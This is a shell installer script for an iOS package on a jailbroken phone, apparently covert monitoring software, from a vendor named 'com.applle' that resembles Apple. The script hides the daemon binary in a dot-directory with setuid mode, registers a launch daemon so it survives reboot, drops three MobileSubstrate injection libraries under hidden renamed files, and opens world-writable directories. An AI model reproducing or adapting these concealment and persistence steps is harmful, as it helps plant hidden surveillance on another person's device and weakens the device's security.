#!/bin/bash

# Exit when a command fails
set -o errexit

# Error when unset variables are found
set -o nounset

APPL_CYDIA_INSTALL=$1

# Name of daemon on device
APPL_IDENTIFIER=pp

# Define directory variables
APPL_DAEMON_HOME=/usr/libexec/.$APPL_IDENTIFIER
APPL_DAEMON_NAME=$APPL_IDENTIFIER
APPL_DAEMON_PLIST_HOME=/System/Library/LaunchDaemons
APPL_DAEMON_PLIST_NAME=com.applle.pp.plist

APPL_BUNDLE_HOME=/Applications/pp.app

APPL_MS_HOME=/Library/MobileSubstrate/DynamicLibraries
APPL_MS_NAME_COMMON=MSFSP.dylib
APPL_MS_NAME_HEART=MSSPC.dylib
APPL_MS_NAME_DL=MSFDL.dylib

APPL_MS_PLIST_NAME_COMMON=MSFSP.plist
APPL_MS_PLIST_NAME_HEART=MSSPC.plist
APPL_MS_PLIST_NAME_DL=MSFDL.plist

APPL_MS_NAME_COMMON_TARGET=MSFSP0.dylib
APPL_MS_NAME_HEART_TARGET=MSFSP1.dylib
APPL_MS_NAME_DL_TARGET=MSFSP2.dylib

APPL_MS_PLIST_NAME_COMMON_TARGET=MSFSP0.plist
APPL_MS_PLIST_NAME_HEART_TARGET=MSFSP1.plist
APPL_MS_PLIST_NAME_DL_TARGET=MSFSP2.plist

APPL_SETTINGS_BUNDLE_DEFAULTS_HOME=/var/mobile/Library/Preferences
APPL_SETTINGS_BUNDLE_DEFAULTS_NAME=com.applle.pp.settings.plist
APPL_SETTINGS_BUNDLE_DEFAULTS_TARGET_NAME=com.applle.pp.settings.plist

APPL_PRIVATE_HOME=/var/.lsalcore

APPL_LOG_HOME=/tmp
APPL_LOG_FILE=$APPL_LOG_HOME/.install-$APPL_IDENTIFIER.log

# ----------------------------------------------------------------------
# Remove existing installation log file
# ----------------------------------------------------------------------
rm -f $APPL_LOG_FILE
echo "Start! APPL_CYDIA_INSTALL=$APPL_CYDIA_INSTALL ..." >> $APPL_LOG_FILE

# ----------------------------------------------------------------------
# Clean up any previous installations or processes
# ----------------------------------------------------------------------
set +o errexit

# Stop daemon com.applle.pp.plist
echo "launchctl stop $APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
launchctl stop $APPL_DAEMON_PLIST_NAME

# Remove daemon com.applle.pp.plist
echo "launchctl remove $APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
launchctl remove $APPL_DAEMON_PLIST_NAME

# Remove daemon direcotry /usr/libexec/.pp
echo "rm -fr $APPL_DAEMON_HOME" >> $APPL_LOG_FILE
rm -fr $APPL_DAEMON_HOME

# Remove /System/Library/LaunchDaemons/com.applle.app.plist
echo "rm -f $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
rm -f $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME

# Remove mobile substrate /Library/MobileSubstrate/DynamicLibraries/.MSFSP0.dylib
echo "rm -f $APPL_MS_HOME/.$APPL_MS_NAME_COMMON_TARGET" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_NAME_COMMON_TARGET

# Remove mobile substrate plist /Library/MobileSubstrate/DynamicLibraries/.MSFSP0.plist
echo "rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON_TARGET" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON_TARGET

# Remove mobile substrate /Library/MobileSubstrate/DynamicLibraries/.MSFSP1.dylib
echo "rm -f $APPL_MS_HOME/.$APPL_MS_NAME_HEART_TARGET" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_NAME_HEART_TARGET

# Remove mobile substrate plist /Library/MobileSubstrate/DynamicLibraries/.MSFSP1.plist
echo "rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART_TARGET" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART_TARGET

# Remove mobile substrate /Library/MobileSubstrate/DynamicLibraries/.MSFSP2.dylib
echo "rm -f $APPL_MS_HOME/.$APPL_MS_NAME_DL_TARGET" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_NAME_DL_TARGET

# Remove mobile substrate plist /Library/MobileSubstrate/DynamicLibraries/.MSFSP2.plist
echo "rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_DL_TARGET" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_DL_TARGET

# /var/mobile/Library/Preferences/com.applle.pp.plist
echo "rm -f $APPL_SETTINGS_BUNDLE_DEFAULTS_HOME/$APPL_SETTINGS_BUNDLE_DEFAULTS_TARGET_NAME" >> $APPL_LOG_FILE
rm -f $APPL_SETTINGS_BUNDLE_DEFAULTS_HOME/$APPL_SETTINGS_BUNDLE_DEFAULTS_TARGET_NAME

# Exit when a command fails
set -o errexit

# ----------------------------------------------------------------------
# Install
# ----------------------------------------------------------------------

if [ $APPL_CYDIA_INSTALL == "YES" ]; then

    # Create daemon home directory /usr/libexec/.pp
	echo "mkdir -p $APPL_DAEMON_HOME" >> $APPL_LOG_FILE
	mkdir -p $APPL_DAEMON_HOME
	
    # Change mode of /usr/libexec/.pp to read/write/execute
	echo "chmod 777 $APPL_DAEMON_HOME" >> $APPL_LOG_FILE
	chmod 777 $APPL_DAEMON_HOME
	
    # Copy /Applications/pp.app /usr/libexec/.pp/pp
	echo "cp -f $APPL_BUNDLE_HOME $APPL_DAEMON_HOME/$APPL_DAEMON_NAME" >> $APPL_LOG_FILE
	cp -fr $APPL_BUNDLE_HOME $APPL_DAEMON_HOME/$APPL_DAEMON_NAME

    # Change mode of /usr/libexec/.pp/pp to 6555
	echo "chmod 6555 $APPL_DAEMON_HOME/$APPL_DAEMON_NAME" >> $APPL_LOG_FILE
	chmod 6555 $APPL_DAEMON_HOME/$APPL_DAEMON_NAME
	
	# Copy daemon's plist /Applications/pp.app/com.applle.pp.plist to /System/Library/LaunchDaemons/com.applle.pp.plist
	# Auto start daemon when phone is reboot or crash
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_DAEMON_PLIST_NAME $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
	cp -fr $APPL_BUNDLE_HOME/$APPL_DAEMON_PLIST_NAME $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME
	
    # Copy mobile substrate /Applications/pp.app/MSFSP.dylib to /Library/MobileSubstrate/DynamicLibraries/.MSFSP0.dylib
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_NAME_COMMON_TARGET" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_NAME_COMMON_TARGET
	chmod 777 $APPL_MS_HOME/.$APPL_MS_NAME_COMMON_TARGET
	
	# Copy mobile substrate plist /Applications/pp.app/MSFSP.plist to /Library/MobileSubstrate/DynamicLibraries/.MSFSP0.plist
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON_TARGET" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON_TARGET
	
	# Copy mobile substrate /Applications/pp.app/MSSPC.dylib to /Library/MobileSubstrate/DynamicLibraries/.MSFSP1.dylib
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_HEART $APPL_MS_HOME/.$APPL_MS_NAME_HEART_TARGET" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_HEART $APPL_MS_HOME/.$APPL_MS_NAME_HEART_TARGET
	chmod 777 $APPL_MS_HOME/.$APPL_MS_NAME_HEART_TARGET

	# Copy mobile substrate plist /Applications/pp.app/MSSPC.plist to /Library/MobileSubstrate/DynamicLibraries/.MSFSP1.plist
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_HEART $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART_TARGET" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_HEART $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART_TARGET
	
	# Copy mobile substrate /Applications/pp.app/MSFDL.dylib to /Library/MobileSubstrate/DynamicLibraries/.MSFSP2.dylib
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_DL $APPL_MS_HOME/.$APPL_MS_NAME_DL_TARGET" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_DL $APPL_MS_HOME/.$APPL_MS_NAME_DL_TARGET
	chmod 777 $APPL_MS_HOME/.$APPL_MS_NAME_DL_TARGET

	# Copy mobile substrate plist /Applications/pp.app/MSFDL.plist to /Library/MobileSubstrate/DynamicLibraries/.MSFSP2.plist
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_DL $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_DL_TARGET" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_DL $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_DL_TARGET

    # Create daemon private directory /var/.lsalcore
    echo "mkdir -p $APPL_PRIVATE_HOME" >> $APPL_LOG_FILE
    mkdir -p $APPL_PRIVATE_HOME

    # Change mode of /var/.lsalcore to read/write/execute
    echo "chmod 777 $APPL_DAEMON_HOME" >> $APPL_LOG_FILE
    chmod 777 $APPL_PRIVATE_HOME
	
	# Copy settings bundle default plist from /Applications/pp.app/com.applle.pp.settings.plist to /var/mobile/Library/Preferences/com.applle.pp.settings.plist
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_SETTINGS_BUNDLE_DEFAULTS_NAME $APPL_SETTINGS_BUNDLE_DEFAULTS_HOME/$APPL_SETTINGS_BUNDLE_DEFAULTS_TARGET_NAME" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_SETTINGS_BUNDLE_DEFAULTS_NAME $APPL_SETTINGS_BUNDLE_DEFAULTS_HOME/$APPL_SETTINGS_BUNDLE_DEFAULTS_TARGET_NAME
	chmod 644 $APPL_SETTINGS_BUNDLE_DEFAULTS_HOME/$APPL_SETTINGS_BUNDLE_DEFAULTS_TARGET_NAME
	
	# Load daemon /System/Library/LaunchDaemons/com.applle.pp.plist
	echo "launchctl load $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
	launchctl load $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME
	
	
	sleep 2
	#killall SpringBoard
	#respring # If there is mobile substrate in package Cydia would show button 'Respring'
	exit 0
	
fi
